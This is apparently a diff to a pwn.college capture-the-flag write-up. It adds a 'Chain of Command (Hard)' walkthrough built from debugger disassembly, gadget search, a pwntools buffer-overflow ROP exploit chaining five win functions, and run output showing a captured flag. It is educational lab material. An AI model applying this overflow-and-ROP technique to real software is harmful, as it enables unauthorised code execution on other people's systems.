@@ -884,7 +884,7 @@ offset = 120
 pop_rdi = 0x402ca3
 
 # Base offset to reach the return address
-payload = b"A" * 120
+payload = b"A" * offset
 
 # Stage 1: win_stage_1(1)
 payload += p64(pop_rdi)
@@ -968,4 +968,491 @@ from within this challenge. You will have to do that by yourself.
 
 Leaving!
 pwn.college{AKuLaEeHPistmjz7_PyUH9Qd5vM.0VN0MDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Chain of Command (Hard)
+
+Requirements to craft an exploit:
+
+- [ ] Location of buffer
+- [ ] Location of return address to `main()`
+- [ ] Offset of instruction in `win_stage_1()` within the program
+- [ ] Argument expected by `win_stage_1()` 
+- [ ] Offset of instruction in `win_stage_2()` within the program
+- [ ] Argument expected by `win_stage_2()` 
+- [ ] Offset of instruction in `win_stage_3()` within the program
+- [ ] Argument expected by `win_stage_3()` 
+- [ ] Offset of instruction in `win_stage_4()` within the program
+- [ ] Argument expected by `win_stage_4()` 
+- [ ] Offset of instruction in `win_stage_5()` within the program
+- [ ] Argument expected by `win_stage_5()` 
+- [ ] Offset of `pop rdi ; ret` gadget within the program
+
+### Binary Analysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000401000  _init
+0x00000000004010c0  putchar@plt
+0x00000000004010d0  puts@plt
+0x00000000004010e0  write@plt
+0x00000000004010f0  printf@plt
+0x0000000000401100  lseek@plt
+0x0000000000401110  close@plt
+0x0000000000401120  read@plt
+0x0000000000401130  setvbuf@plt
+0x0000000000401140  open@plt
+0x0000000000401150  _start
+0x0000000000401180  _dl_relocate_static_pie
+0x0000000000401190  deregister_tm_clones
+0x00000000004011c0  register_tm_clones
+0x0000000000401200  __do_global_dtors_aux
+0x0000000000401230  frame_dummy
+0x0000000000401236  bin_padding
+0x0000000000402079  win_stage_2
+0x0000000000402159  win_stage_3
+0x000000000040223b  win_stage_1
+0x0000000000402317  win_stage_5
+0x00000000004023fa  win_stage_4
+0x00000000004024e0  challenge
+0x000000000040251f  main
+0x00000000004025e0  __libc_csu_init
+0x0000000000402650  __libc_csu_fini
+0x0000000000402658  _fini
+```
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x00000000004024e0 <+0>:     endbr64
+   0x00000000004024e4 <+4>:     push   rbp
+   0x00000000004024e5 <+5>:     mov    rbp,rsp
+   0x00000000004024e8 <+8>:     add    rsp,0xffffffffffffff80
+   0x00000000004024ec <+12>:    mov    DWORD PTR [rbp-0x64],edi
+   0x00000000004024ef <+15>:    mov    QWORD PTR [rbp-0x70],rsi
+   0x00000000004024f3 <+19>:    mov    QWORD PTR [rbp-0x78],rdx
+   0x00000000004024f7 <+23>:    lea    rax,[rbp-0x60]
+   0x00000000004024fb <+27>:    mov    edx,0x1000
+   0x0000000000402500 <+32>:    mov    rsi,rax
+   0x0000000000402503 <+35>:    mov    edi,0x0
+   0x0000000000402508 <+40>:    call   0x401120 <read@plt>
+   0x000000000040250d <+45>:    mov    DWORD PTR [rbp-0x4],eax
+   0x0000000000402510 <+48>:    lea    rdi,[rip+0xb0b]        # 0x403022
+   0x0000000000402517 <+55>:    call   0x4010d0 <puts@plt>
+   0x000000000040251c <+60>:    nop
+   0x000000000040251d <+61>:    leave
+   0x000000000040251e <+62>:    ret
+End of assembler dump.
+```
+
+A the call to `read@plt` is made at `challenge+40`. Let's set a breakpoint and run the program.
+
+```
+pwndbg> break *(challenge+40)
+Breakpoint 1 at 0x402508
+```
+
+```
+pwndbg> run
+Starting program: /challenge/chain-of-command-hard 
+###
+### Welcome to /challenge/chain-of-command-hard!
+###
+
+
+Breakpoint 1, 0x0000000000402508 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7ffd74326e20 ◂— 0
+ RBX  0x4025e0 (__libc_csu_init) ◂— endbr64 
+ RCX  0x7ffd74326fa8 —▸ 0x7ffd74327666 ◂— '/challenge/chain-of-command-hard'
+ RDX  0x1000
+ RDI  0
+ RSI  0x7ffd74326e20 ◂— 0
+ R8   0
+ R9   0x31
+ R10  0xfffffffffffff58f
+ R11  0x7a3d9e266ce0 (setvbuf) ◂— endbr64 
+ R12  0x401150 (_start) ◂— endbr64 
+ R13  0x7ffd74326fa0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffd74326e80 —▸ 0x7ffd74326eb0 ◂— 0
+ RSP  0x7ffd74326e00 —▸ 0x7a3d9e3cb4a0 (_IO_file_jumps) ◂— 0
+ RIP  0x402508 (challenge+40) ◂— call read@plt
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x402508 <challenge+40>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/0)
+        buf: 0x7ffd74326e20 ◂— 0
+        nbytes: 0x1000
+ 
+   0x40250d <challenge+45>    mov    dword ptr [rbp - 4], eax
+   0x402510 <challenge+48>    lea    rdi, [rip + 0xb0b]           RDI => 0x403022 ◂— 'Leaving!'
+   0x402517 <challenge+55>    call   puts@plt                    <puts@plt>
+ 
+   0x40251c <challenge+60>    nop    
+   0x40251d <challenge+61>    leave  
+   0x40251e <challenge+62>    ret    
+ 
+   0x40251f <main>            endbr64 
+   0x402523 <main+4>          push   rbp
+   0x402524 <main+5>          mov    rbp, rsp
+   0x402527 <main+8>          sub    rsp, 0x20
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7ffd74326e00 —▸ 0x7a3d9e3cb4a0 (_IO_file_jumps) ◂— 0
+01:0008│-078     0x7ffd74326e08 —▸ 0x7ffd74326fb8 —▸ 0x7ffd74327687 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-070     0x7ffd74326e10 —▸ 0x7ffd74326fa8 —▸ 0x7ffd74327666 ◂— '/challenge/chain-of-command-hard'
+03:0018│-068     0x7ffd74326e18 ◂— 0x19e2745dd
+04:0020│ rax rsi 0x7ffd74326e20 ◂— 0
+05:0028│-058     0x7ffd74326e28 —▸ 0x7a3d9e3cf6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+06:0030│-050     0x7ffd74326e30 ◂— 0
+07:0038│-048     0x7ffd74326e38 ◂— 0
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0         0x402508 challenge+40
+   1         0x4025c4 main+165
+   2   0x7a3d9e206083 __libc_start_main+243
+   3         0x40117e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of buffer: `0x7ffd74326e20`
+- [ ] Location of return address to `main()`
+- [ ] Offset of instruction in `win_stage_1()` within the program
+- [ ] Argument expected by `win_stage_1()` 
+- [ ] Offset of instruction in `win_stage_2()` within the program
+- [ ] Argument expected by `win_stage_2()` 
+- [ ] Offset of instruction in `win_stage_3()` within the program
+- [ ] Argument expected by `win_stage_3()` 
+- [ ] Offset of instruction in `win_stage_4()` within the program
+- [ ] Argument expected by `win_stage_4()` 
+- [ ] Offset of instruction in `win_stage_5()` within the program
+- [ ] Argument expected by `win_stage_5()` 
+- [ ] Offset of `pop rdi ; ret` gadget within the program
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7ffd74326e90:
+ rip = 0x402508 in challenge; saved rip = 0x4025c4
+ called by frame at 0x7ffd74326ec0
+ Arglist at 0x7ffd74326e80, args: 
+ Locals at 0x7ffd74326e80, Previous frame's sp is 0x7ffd74326e90
+ Saved registers:
+  rbp at 0x7ffd74326e80, rip at 0x7ffd74326e88
+```
+
+- [x] Location of buffer: `0x7ffd74326e20`
+- [x] Location of return address to `main()`: `0x7ffd74326e88`
+- [ ] Offset of instruction in `win_stage_1()` within the program
+- [ ] Argument expected by `win_stage_1()` 
+- [ ] Offset of instruction in `win_stage_2()` within the program
+- [ ] Argument expected by `win_stage_2()` 
+- [ ] Offset of instruction in `win_stage_3()` within the program
+- [ ] Argument expected by `win_stage_3()` 
+- [ ] Offset of instruction in `win_stage_4()` within the program
+- [ ] Argument expected by `win_stage_4()` 
+- [ ] Offset of instruction in `win_stage_5()` within the program
+- [ ] Argument expected by `win_stage_5()` 
+- [ ] Offset of `pop rdi ; ret` gadget within the program
+
+Now, let's get the offsets of such instructions within the `win_stage_*()` functions that we skip the argument checks.
+
+#### `win_stage_1()`
+
+```
+pwndbg> disassemble win_stage_1
+Dump of assembler code for function win_stage_1:
+   0x000000000040223b <+0>:     endbr64
+   0x000000000040223f <+4>:     push   rbp
+   0x0000000000402240 <+5>:     mov    rbp,rsp
+   0x0000000000402243 <+8>:     sub    rsp,0x120
+   0x000000000040224a <+15>:    mov    DWORD PTR [rbp-0x114],edi
+   0x0000000000402250 <+21>:    cmp    DWORD PTR [rbp-0x114],0x1
+   0x0000000000402257 <+28>:    je     0x40226a <win_stage_1+47>
+   0x0000000000402259 <+30>:    lea    rdi,[rip+0xda4]        # 0x403004
+   0x0000000000402260 <+37>:    call   0x4010d0 <puts@plt>
+   0x0000000000402265 <+42>:    jmp    0x402315 <win_stage_1+218>
+   0x000000000040226a <+47>:    mov    esi,0x0
+   
+# ---- snip ----
+
+   0x0000000000402315 <+218>:   leave
+   0x0000000000402316 <+219>:   ret
+End of assembler dump.
+```
+
+- [x] Location of buffer: `0x7ffd74326e20`
+- [x] Location of return address to `main()`: `0x7ffd74326e88`
+- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
+- [x] Argument expected by `win_stage_1()`: `0x1` 
+- [ ] Offset of instruction in `win_stage_2()` within the program
+- [ ] Argument expected by `win_stage_2()` 
+- [ ] Offset of instruction in `win_stage_3()` within the program
+- [ ] Argument expected by `win_stage_3()` 
+- [ ] Offset of instruction in `win_stage_4()` within the program
+- [ ] Argument expected by `win_stage_4()` 
+- [ ] Offset of instruction in `win_stage_5()` within the program
+- [ ] Argument expected by `win_stage_5()` 
+- [ ] Offset of `pop rdi ; ret` gadget within the program
+
+#### `win_stage_2()`
+
+```
+pwndbg> disassemble win_stage_2
+Dump of assembler code for function win_stage_2:
+   0x0000000000402079 <+0>:     endbr64
+   0x000000000040207d <+4>:     push   rbp
+   0x000000000040207e <+5>:     mov    rbp,rsp
+   0x0000000000402081 <+8>:     sub    rsp,0x120
+   0x0000000000402088 <+15>:    mov    DWORD PTR [rbp-0x114],edi
+   0x000000000040208e <+21>:    cmp    DWORD PTR [rbp-0x114],0x2
+   0x0000000000402095 <+28>:    je     0x4020a8 <win_stage_2+47>
+   0x0000000000402097 <+30>:    lea    rdi,[rip+0xf66]        # 0x403004
+   0x000000000040209e <+37>:    call   0x4010d0 <puts@plt>
+   0x00000000004020a3 <+42>:    jmp    0x402157 <win_stage_2+222>
+   0x00000000004020a8 <+47>:    mov    esi,0x0
+
+# ---- snip ----
+
+   0x0000000000402157 <+222>:   leave
+   0x0000000000402158 <+223>:   ret
+End of assembler dump.
+```
+
+- [x] Location of buffer: `0x7ffd74326e20`
+- [x] Location of return address to `main()`: `0x7ffd74326e88`
+- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
+- [x] Argument expected by `win_stage_1()`: `0x1` 
+- [x] Offset of instruction in `win_stage_2()` within the program: `0x402079`
+- [x] Argument expected by `win_stage_2()`: `0x2`
+- [ ] Offset of instruction in `win_stage_3()` within the program
+- [ ] Argument expected by `win_stage_3()` 
+- [ ] Offset of instruction in `win_stage_4()` within the program
+- [ ] Argument expected by `win_stage_4()` 
+- [ ] Offset of instruction in `win_stage_5()` within the program
+- [ ] Argument expected by `win_stage_5()` 
+- [ ] Offset of `pop rdi ; ret` gadget within the program
+
+#### `win_stage_3()`
+
+```
+pwndbg> disassemble win_stage_3
+Dump of assembler code for function win_stage_3:
+   0x0000000000402159 <+0>:     endbr64
+   0x000000000040215d <+4>:     push   rbp
+   0x000000000040215e <+5>:     mov    rbp,rsp
+   0x0000000000402161 <+8>:     sub    rsp,0x120
+   0x0000000000402168 <+15>:    mov    DWORD PTR [rbp-0x114],edi
+   0x000000000040216e <+21>:    cmp    DWORD PTR [rbp-0x114],0x3
+   0x0000000000402175 <+28>:    je     0x402188 <win_stage_3+47>
+   0x0000000000402177 <+30>:    lea    rdi,[rip+0xe86]        # 0x403004
+   0x000000000040217e <+37>:    call   0x4010d0 <puts@plt>
+   0x0000000000402183 <+42>:    jmp    0x402239 <win_stage_3+224>
+   0x0000000000402188 <+47>:    mov    esi,0x0
+
+# ---- snip ----
+
+   0x0000000000402239 <+224>:   leave
+   0x000000000040223a <+225>:   ret
+End of assembler dump.
+```
+
+- [x] Location of buffer: `0x7ffd74326e20`
+- [x] Location of return address to `main()`: `0x7ffd74326e88`
+- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
+- [x] Argument expected by `win_stage_1()`: `0x1`
+- [x] Offset of instruction in `win_stage_2()` within the program: `0x402079`
+- [x] Argument expected by `win_stage_2()`: `0x2`
+- [x] Offset of instruction in `win_stage_3()` within the program: `0x402159`
+- [x] Argument expected by `win_stage_3()`: `0x3` 
+- [ ] Offset of instruction in `win_stage_4()` within the program
+- [ ] Argument expected by `win_stage_4()` 
+- [ ] Offset of instruction in `win_stage_5()` within the program
+- [ ] Argument expected by `win_stage_5()` 
+- [ ] Offset of `pop rdi ; ret` gadget within the program
+
+#### `win_stage_4()`
+
+```
+pwndbg> disassemble win_stage_4
+Dump of assembler code for function win_stage_4:
+   0x00000000004023fa <+0>:     endbr64
+   0x00000000004023fe <+4>:     push   rbp
+   0x00000000004023ff <+5>:     mov    rbp,rsp
+   0x0000000000402402 <+8>:     sub    rsp,0x120
+   0x0000000000402409 <+15>:    mov    DWORD PTR [rbp-0x114],edi
+   0x000000000040240f <+21>:    cmp    DWORD PTR [rbp-0x114],0x4
+   0x0000000000402416 <+28>:    je     0x402429 <win_stage_4+47>
+   0x0000000000402418 <+30>:    lea    rdi,[rip+0xbe5]        # 0x403004
+   0x000000000040241f <+37>:    call   0x4010d0 <puts@plt>
+   0x0000000000402424 <+42>:    jmp    0x4024de <win_stage_4+228>
+   0x0000000000402429 <+47>:    mov    esi,0x0
+
+# ---- snip ----
+
+   0x00000000004024de <+228>:   leave
+   0x00000000004024df <+229>:   ret
+End of assembler dump.
+```
+
+- [x] Location of buffer: `0x7ffd74326e20`
+- [x] Location of return address to `main()`: `0x7ffd74326e88`
+- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
+- [x] Argument expected by `win_stage_1()`: `0x1`
+- [x] Offset of instruction in `win_stage_2()` within the program: `0x402079`
+- [x] Argument expected by `win_stage_2()`: `0x2`
+- [x] Offset of instruction in `win_stage_3()` within the program: `0x402159`
+- [x] Argument expected by `win_stage_3()`: `0x3` 
+- [x] Offset of instruction in `win_stage_4()` within the program: `0x4023fa`
+- [x] Argument expected by `win_stage_4()`: `0x4`
+- [ ] Offset of instruction in `win_stage_5()` within the program
+- [ ] Argument expected by `win_stage_5()` 
+- [ ] Offset of `pop rdi ; ret` gadget within the program
+
+#### `win_stage_5()`
+
+```
+pwndbg> disassemble win_stage_5
+Dump of assembler code for function win_stage_5:
+   0x0000000000402317 <+0>:     endbr64
+   0x000000000040231b <+4>:     push   rbp
+   0x000000000040231c <+5>:     mov    rbp,rsp
+   0x000000000040231f <+8>:     sub    rsp,0x120
+   0x0000000000402326 <+15>:    mov    DWORD PTR [rbp-0x114],edi
+   0x000000000040232c <+21>:    cmp    DWORD PTR [rbp-0x114],0x5
+   0x0000000000402333 <+28>:    je     0x402346 <win_stage_5+47>
+   0x0000000000402335 <+30>:    lea    rdi,[rip+0xcc8]        # 0x403004
+   0x000000000040233c <+37>:    call   0x4010d0 <puts@plt>
+   0x0000000000402341 <+42>:    jmp    0x4023f8 <win_stage_5+225>
+   0x0000000000402346 <+47>:    mov    esi,0x0
+
+# ---- snip ----
+
+   0x00000000004023f8 <+225>:   leave
+   0x00000000004023f9 <+226>:   ret
+End of assembler dump.
+```
+
+- [x] Location of buffer: `0x7ffd74326e20`
+- [x] Location of return address to `main()`: `0x7ffd74326e88`
+- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
+- [x] Argument expected by `win_stage_1()`: `0x1`
+- [x] Offset of instruction in `win_stage_2()` within the program: `0x402079` 
+- [x] Argument expected by `win_stage_2()`: `0x2`
+- [x] Offset of instruction in `win_stage_3()` within the program: `0x402159`
+- [x] Argument expected by `win_stage_3()`: `0x3` 
+- [x] Offset of instruction in `win_stage_4()` within the program: `0x4023fa`
+- [x] Argument expected by `win_stage_4()`: `0x4`
+- [x] Offset of instruction in `win_stage_5()` within the program: `0x402317`
+- [x] Argument expected by `win_stage_5()`: `0x5`
+- [ ] Offset of `pop rdi ; ret` gadget within the program
+
+#### `pop rdi ; ret` gadget
+
+Now let's find the address of the `pop rdi ; ret` gadget.
+
+```
+hacker@return-oriented-programming~chain-of-command-hard:/$ ROPgadget --binary /challenge/chain-of-command-hard | grep "pop rdi ; ret"
+0x0000000000402643 : pop rdi ; ret
+```
+
+### ROP chain
+
+The ROP chain in this challenge, will be the same as the [last level](#rop-chain), only with different addresses.
+
+### Exploit
+
+```py
+from pwn import *
+
+# Initialize required values
+win_stage_1_offset = 0x40223b
+win_stage_1_arg = 1
+win_stage_2_offset = 0x402079
+win_stage_2_arg = 2
+win_stage_3_offset = 0x402159
+win_stage_3_arg = 3
+win_stage_4_offset = 0x4023fa
+win_stage_4_arg = 4
+win_stage_5_offset = 0x402317
+win_stage_5_arg = 5
+
+buffer_addr = 0x7ffd74326e20
+addr_of_saved_ip = 0x7ffd74326e88
+
+# Calculate offset
+offset = addr_of_saved_ip - buffer_addr
+
+# Gadget address found
+pop_rdi = 0x402643
+
+# Base offset to reach the return address
+payload = b"A" * offset
+
+# Stage 1: win_stage_1(1)
+payload += p64(pop_rdi)
+payload += p64(1)
+payload += p64(win_stage_1_offset)
+
+# Stage 2: win_stage_2(2)
+payload += p64(pop_rdi)
+payload += p64(2)
+payload += p64(win_stage_2_offset)
+
+# Stage 3: win_stage_3(3)
+payload += p64(pop_rdi)
+payload += p64(3)
+payload += p64(win_stage_3_offset)
+
+# Stage 4: win_stage_4(4)
+payload += p64(pop_rdi)
+payload += p64(4)
+payload += p64(win_stage_4_offset)
+
+# Stage 5: win_stage_5(5)
+payload += p64(pop_rdi)
+payload += p64(5)
+payload += p64(win_stage_5_offset)
+
+attempt = 0
+
+while True:
+    attempt += 1
+    print(f"[+] Attempt {attempt}")
+
+    p = process('/challenge/chain-of-command-hard')
+    try:
+        p.send(payload)
+        output = p.recvall(timeout=1).decode(errors="ignore")
+
+        if "pwn.college{" in output:
+            print("[!!!] FLAG FOUND !!!")
+            print(output)
+            break
+
+    except Exception:
+        pass
+    finally:
+        p.close()
+```
+
+```
+hacker@return-oriented-programming~chain-of-command-hard:/$ python ~/script.py 
+[+] Attempt 1
+[+] Starting local process '/challenge/chain-of-command-hard': pid 13432
+[+] Receiving all data: Done (124B)
+[*] Process '/challenge/chain-of-command-hard' stopped with exit code -11 (SIGSEGV) (pid 13432)
+[!!!] FLAG FOUND !!!
+###
+### Welcome to /challenge/chain-of-command-hard!
+###
+
+Leaving!
+pwn.college{EUjrXInTnvQAkZEX53BXXgHbktj.0lN0MDL4ITM0EzW}
 ```
